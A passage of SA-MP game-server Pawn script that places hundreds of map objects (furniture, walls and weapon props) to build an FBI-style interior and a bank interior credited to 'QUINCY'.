	CreateDynamicObject(11729, 1809.52441, -1311.99756, 42.97770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11729, 1808.84387, -1311.99756, 42.97770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11729, 1808.20410, -1311.99756, 42.97770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11729, 1813.48059, -1311.99756, 42.97770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(18092, 1815.97900, -1306.53052, 43.49810,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18092, 1818.18738, -1309.68616, 43.49810,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2400, 1808.67529, -1305.99609, 44.10010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(351, 1810.81763, -1305.99365, 45.03260,   0.00000, 10.00000, 0.00000);
	CreateDynamicObject(351, 1809.63525, -1305.99829, 45.03260,   0.00000, 10.00000, 0.00000);
	CreateDynamicObject(351, 1808.43530, -1305.99829, 45.03260,   0.00000, 10.00000, 0.00000);
	CreateDynamicObject(353, 1810.81958, -1305.98779, 45.75020,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(353, 1811.43958, -1305.98779, 45.75020,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(353, 1810.21960, -1305.98779, 45.75020,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(353, 1809.65955, -1305.98779, 45.75020,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(353, 1809.05957, -1305.98779, 45.75020,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(353, 1808.45959, -1305.98779, 45.75020,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1807.15039, -1306.17627, 43.15630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1808.33301, -1306.16992, 43.15630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1809.53528, -1306.17920, 43.15630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1810.73401, -1306.18726, 43.15630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1811.91321, -1306.17847, 43.15630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1813.08179, -1306.17871, 43.15630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1812.52344, -1306.11523, 43.37630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1810.16541, -1306.04309, 43.37630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1811.34595, -1306.03638, 43.37630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1808.96179, -1306.04895, 43.37630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2060, 1807.76111, -1306.09180, 43.37630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2043, 1813.63818, -1306.31226, 44.07710,   0.00000, 0.00000, 10.00000);
	CreateDynamicObject(2043, 1814.00281, -1306.32642, 44.07710,   0.00000, 0.00000, 50.00000);
	CreateDynamicObject(2043, 1814.62329, -1306.32556, 44.07710,   0.00000, 0.00000, -20.00000);
	CreateDynamicObject(2043, 1813.91736, -1307.06445, 44.07710,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(356, 1815.85400, -1306.32397, 44.03710,   90.00000, 0.00000, 180.00000);
	CreateDynamicObject(356, 1815.73962, -1306.65466, 44.03710,   90.00000, 0.00000, 180.00000);
	CreateDynamicObject(356, 1816.98352, -1306.25024, 44.03710,   90.00000, 0.00000, 180.00000);
	CreateDynamicObject(356, 1816.92456, -1306.62671, 44.03710,   90.00000, 0.00000, 180.00000);
	CreateDynamicObject(343, 1817.98743, -1306.42041, 43.99772,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(343, 1817.82239, -1306.09497, 43.99772,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(343, 1818.08118, -1306.11865, 43.99772,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(343, 1817.60669, -1306.47693, 43.99772,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(343, 1818.21753, -1306.62073, 43.99772,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(343, 1817.79053, -1306.79639, 43.99772,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(343, 1818.01721, -1306.85107, 43.99772,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(343, 1817.57715, -1307.05164, 43.99772,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(334, 1817.80310, -1307.49316, 43.97770,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(334, 1817.77356, -1307.73291, 43.97770,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(334, 1817.74402, -1307.97278, 43.97770,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(334, 1817.74670, -1308.18127, 43.97770,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(335, 1817.73242, -1308.34717, 43.95760,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(335, 1817.72302, -1308.52820, 43.95760,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(335, 1817.75354, -1308.70715, 43.95760,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(335, 1817.70178, -1308.85046, 43.95760,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(335, 1817.71118, -1309.01025, 43.95760,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(335, 1817.80054, -1309.16504, 43.95760,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(348, 1818.22571, -1309.46655, 43.99730,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(348, 1818.16809, -1309.80420, 43.99730,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(348, 1818.27136, -1310.14966, 43.99730,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(348, 1817.89075, -1310.15039, 43.99730,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(348, 1817.68091, -1309.93933, 43.99730,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(348, 1817.87939, -1309.58875, 43.99730,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(348, 1817.68616, -1309.45850, 43.99730,   90.00000, 0.00000, 90.00000);
	CreateDynamicObject(371, 1817.82251, -1310.50586, 43.99770,   -90.00000, 0.00000, 90.00000);
	CreateDynamicObject(371, 1818.06409, -1310.97278, 43.99770,   -90.00000, 0.00000, 90.00000);
	CreateDynamicObject(371, 1817.93103, -1311.52478, 43.99770,   -90.00000, 0.00000, 90.00000);
	CreateDynamicObject(371, 1818.12732, -1311.97205, 43.99770,   -90.00000, 0.00000, 90.00000);
	CreateDynamicObject(18637, 1817.46558, -1307.23315, 43.62000,   80.00000, 0.00000, -90.00000);
	CreateDynamicObject(18637, 1817.46558, -1307.87952, 43.62000,   80.00000, 0.00000, -90.00000);
	CreateDynamicObject(18637, 1817.46558, -1308.51062, 43.62000,   80.00000, 0.00000, -90.00000);
	CreateDynamicObject(18637, 1817.46558, -1309.20459, 43.62000,   80.00000, 0.00000, -90.00000);
	CreateDynamicObject(18637, 1817.46558, -1309.82910, 43.62000,   80.00000, 0.00000, -90.00000);
	CreateDynamicObject(1703, 1811.89319, -1301.08545, 43.03280,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1703, 1814.93152, -1301.08545, 43.03280,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1703, 1817.16345, -1298.70288, 43.03280,   0.00000, 0.00000, -120.00000);
	CreateDynamicObject(14455, 1818.34436, -1297.55505, 44.71710,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1703, 1808.94885, -1301.08545, 43.03280,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1737, 1811.91138, -1298.20142, 42.69660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1737, 1808.90857, -1298.20142, 42.69660,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2224, 1816.42468, -1288.02161, 42.99480,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1704, 1812.72327, -1289.94568, 43.01680,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1704, 1813.46326, -1291.69287, 43.01680,   0.00000, 0.00000, 130.00000);
	CreateDynamicObject(1703, 1816.63208, -1291.97766, 43.03280,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1737, 1815.02087, -1289.49341, 42.69660,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(3494, 1811.08960, -1293.05884, 45.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3494, 1778.48645, -1307.21265, 45.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3494, 1778.66406, -1299.53076, 45.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3494, 1815.97766, -1279.72351, 45.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3494, 1829.41003, -1279.86597, 45.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3494, 1829.25806, -1295.26965, 45.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3494, 1829.04541, -1314.62012, 45.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3494, 1814.95190, -1314.64648, 45.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2606, 1831.76709, -1279.61267, 44.23520,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2606, 1831.76709, -1279.61267, 44.63520,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2606, 1833.76001, -1279.61267, 44.63520,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2606, 1833.76001, -1279.61267, 44.23520,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2604, 1833.05652, -1272.54602, 43.79610,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(2164, 1835.60278, -1276.87561, 42.95690,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2164, 1835.60278, -1275.09998, 42.95690,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1663, 1831.91516, -1272.71985, 43.43730,   0.00000, 0.00000, -230.00000);
	CreateDynamicObject(1703, 1830.01343, -1277.67969, 42.95690,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(2193, 1834.14478, -1280.50696, 43.03730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2193, 1834.14478, -1282.40662, 43.03730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2193, 1834.14478, -1284.30518, 43.03730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2193, 1834.14478, -1286.20911, 43.03730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2193, 1834.14478, -1288.09790, 43.03730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2193, 1834.14478, -1290.00195, 43.03730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2193, 1834.14478, -1291.89783, 43.03730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2193, 1834.14478, -1293.79614, 43.03730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2193, 1834.14478, -1295.69690, 43.03730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2198, 1824.65674, -1287.46716, 43.03570,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2198, 1824.65674, -1290.31226, 43.03570,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2198, 1824.65674, -1293.23389, 43.03570,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2198, 1824.65674, -1296.48535, 43.03570,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2198, 1824.65674, -1299.97510, 43.03570,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2198, 1824.65674, -1303.66418, 43.03570,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2198, 1824.65674, -1307.66064, 43.03570,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2164, 1835.60278, -1297.70325, 42.95690,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2164, 1835.60278, -1299.48291, 42.95690,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2164, 1835.60278, -1301.24255, 42.95690,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2164, 1835.60278, -1303.00256, 42.95690,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2164, 1835.60278, -1304.76099, 42.95690,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2164, 1835.60278, -1306.50134, 42.95690,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2164, 1835.60278, -1308.26453, 42.95690,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2164, 1835.60278, -1310.02515, 42.95690,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2010, 1835.38525, -1311.77283, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1824.56116, -1311.81909, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1830.17456, -1280.49695, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1823.90442, -1286.78369, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1818.55176, -1286.82642, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1828.63330, -1279.27881, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1831.53308, -1270.75342, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1820.77197, -1270.75012, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1812.50757, -1275.57373, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1812.05798, -1283.84583, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1800.32971, -1295.10498, 43.03822,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2309, 1834.22437, -1281.20337, 43.03650,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2309, 1834.10767, -1283.12524, 43.03650,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2309, 1834.17017, -1284.96411, 43.03650,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2309, 1834.13025, -1286.96484, 43.03650,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2309, 1834.16919, -1288.82471, 43.03650,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2309, 1834.20898, -1290.76379, 43.03650,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2309, 1834.20044, -1292.70398, 43.03650,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2309, 1834.17090, -1294.60461, 43.03650,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2309, 1834.14063, -1296.44519, 43.03650,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2309, 1825.44727, -1304.82764, 43.03650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2309, 1825.36072, -1308.93835, 43.03650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2309, 1825.37244, -1301.01294, 43.03650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2309, 1825.35779, -1294.38269, 43.03650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2309, 1825.39221, -1297.57300, 43.03650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2309, 1825.44421, -1291.00134, 43.03650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2309, 1825.30457, -1288.71802, 43.03650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1775, 1784.17041, -1306.82703, 44.12000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1302, 1786.55005, -1306.74695, 43.04000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1776, 1785.38025, -1306.82703, 44.12000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14394, 1817.73120, -1275.50659, 42.75400,   0.00000, 0.00000, 120.00000);
	CreateDynamicObject(19362, 1818.26990, -1271.89063, 43.49710,   0.00000, 90.00000, 120.00000);
	CreateDynamicObject(19362, 1816.40784, -1272.97156, 43.49710,   0.00000, 90.00000, 120.00000);
	CreateDynamicObject(19362, 1814.33899, -1274.15002, 43.49710,   0.00000, 90.00000, 120.00000);
	CreateDynamicObject(19442, 1820.66138, -1272.70117, 43.00000,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(19442, 1819.92224, -1271.43701, 43.00000,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(19442, 1813.05469, -1275.26428, 43.00000,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(19442, 1813.86023, -1276.64075, 43.00000,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(19611, 1817.14148, -1274.25378, 43.58340,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19610, 1817.14771, -1274.28418, 45.22000,   30.00000, 0.00000, 20.00000);
	CreateDynamicObject(2614, 1816.33777, -1272.93689, 46.43430,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(2309, 1817.25623, -1278.85767, 43.03650,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(2309, 1817.82605, -1278.56030, 43.03650,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(2309, 1818.36719, -1278.25623, 43.03650,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(2309, 1818.87891, -1277.94751, 43.03650,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(2309, 1817.90881, -1279.96521, 43.03650,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(2309, 1818.43481, -1279.64063, 43.03650,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(2309, 1818.96582, -1279.29126, 43.03650,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(2309, 1819.49939, -1278.94556, 43.03650,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(2309, 1820.61133, -1276.98376, 43.03650,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(2309, 1821.07690, -1276.61450, 43.03650,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(2309, 1821.55347, -1276.22839, 43.03650,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(2309, 1821.98950, -1275.79346, 43.03650,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(2309, 1821.30688, -1277.91321, 43.03650,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(2309, 1821.78345, -1277.52722, 43.03650,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(2309, 1822.28076, -1277.10596, 43.03650,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(2309, 1822.73352, -1276.68127, 43.03650,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(2205, 1819.14258, -1314.51990, 42.89790,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2166, 1818.15784, -1312.63110, 43.03770,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1663, 1818.06274, -1315.22510, 43.47880,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2164, 1823.16382, -1312.33203, 43.03880,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1704, 1821.23584, -1315.74731, 43.01890,   0.00000, 0.00000, -110.00000);
	CreateDynamicObject(1704, 1820.99451, -1313.39453, 43.01890,   0.00000, 0.00000, -80.00000);
	CreateDynamicObject(2164, 1824.90271, -1312.34595, 43.03880,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2164, 1826.65942, -1312.35718, 43.03880,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2126, 1824.89111, -1316.71582, 43.03730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1808, 1815.64294, -1312.46338, 42.99790,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1814.75305, -1312.75806, 43.03791,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2608, 1814.55444, -1316.67834, 44.88870,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2614, 1834.07288, -1312.02808, 46.32900,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2010, 1814.85498, -1318.44800, 43.03791,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2010, 1832.05518, -1317.86804, 43.03791,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1703, 1826.54480, -1317.74353, 42.95730,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2886, 1833.08655, -1312.10559, 44.52350,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1523, 1806.50037, -1311.39014, 42.95840,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1523, 1797.51355, -1304.13770, 42.95840,   0.00000, 0.00000, 0.00000);
	fbidoor = CreateDynamicObject(1569, 1833.33484, -1312.20386, 42.99740,   0.00000, 0.00000, 0.00000);
	// New Bank Interior by QUINCY
	CreateDynamicObject(19377,2226.1987300,2073.6489300,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2226.2233900,2083.2309600,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2073.6474600,2073.6474600,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2236.5332000,2073.6210900,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2236.5332000,2083.2556200,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(14622,2236.8178700,2083.0000000,102.6800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19377,2246.9809600,2073.6394000,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2246.9387200,2083.2768600,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2226.2028800,2092.8232400,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2236.5383300,2092.8232400,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2246.9726600,2092.8232400,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2238.3095700,2099.3891600,99.2913000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19446,2252.1377000,2073.6084000,100.9200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2252.1377000,2083.2399900,100.9200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2252.1377000,2092.8400900,100.9200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2252.1377000,2073.6084000,104.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2252.1377000,2083.2399900,104.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2252.1377000,2092.8400900,104.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2221.0251500,2073.6084000,100.9200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2221.0251500,2083.2399900,100.9200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2221.0251500,2092.8400900,100.9200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2221.0251500,2092.8400900,104.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2221.0251500,2083.2399900,104.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2221.0251500,2073.6084000,104.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2241.7128900,2102.2905300,100.9200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2233.0000000,2102.2905300,100.9200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19446,2236.2502400,2104.1799300,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19427,2241.8649900,2104.1799300,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2226.4875500,2097.5625000,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19427,2220.9135700,2097.5625000,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2226.4875500,2097.5625000,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19427,2220.9135700,2097.5625000,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2246.4599600,2097.5625000,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2246.4599600,2097.5625000,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19427,2252.0600600,2097.5625000,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19427,2252.0600600,2097.5625000,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2225.8513200,2068.8608400,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2235.4799800,2068.8803700,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2245.1001000,2068.8803700,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19427,2250.6967800,2068.8803700,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19427,2252.2968800,2068.8803700,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19427,2252.2968800,2068.8803700,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19427,2250.6967800,2068.8803700,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2245.1001000,2068.8803700,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2225.8513200,2068.8608400,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2235.4799800,2068.8803700,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2176,2222.8056600,2070.5754400,102.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2176,2250.3623000,2070.5754400,102.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2176,2222.8056600,2095.8190900,102.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2176,2250.3535200,2095.8190900,102.1400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2206,2224.4287100,2076.5461400,99.3718000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2206,2224.4287100,2079.3798800,99.3718000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2206,2224.4287100,2082.2199700,99.3718000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2206,2224.4287100,2091.3308100,99.3718000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2206,2224.4287100,2085.6831100,99.3718000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2206,2224.4287100,2088.5078100,99.3718000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2206,2249.0510300,2074.6521000,99.3718000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2206,2249.0510300,2077.4751000,99.3718000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2206,2249.0510300,2080.3200700,99.3718000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2206,2249.0510300,2083.8200700,99.3718000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2206,2249.0510300,2086.6401400,99.3718000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2206,2249.0510300,2089.4799800,99.3718000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(970,2246.5000000,2091.4204100,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5000000,2089.3803700,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5000000,2088.6003400,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5000000,2086.5603000,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5249000,2085.7629400,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5249000,2083.7429200,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5249000,2082.2429200,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5249000,2080.2429200,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5249000,2079.4228500,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5249000,2077.3798800,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5249000,2076.6001000,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2251.5363800,2058.0805700,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2246.5249000,2074.5432100,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2074.6032700,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2076.6032700,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2077.4233400,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2079.4433600,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2080.2832000,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2082.3032200,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2083.7434100,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2085.7631800,99.7138000,0.0000000,0.0000000,0.0000000); //
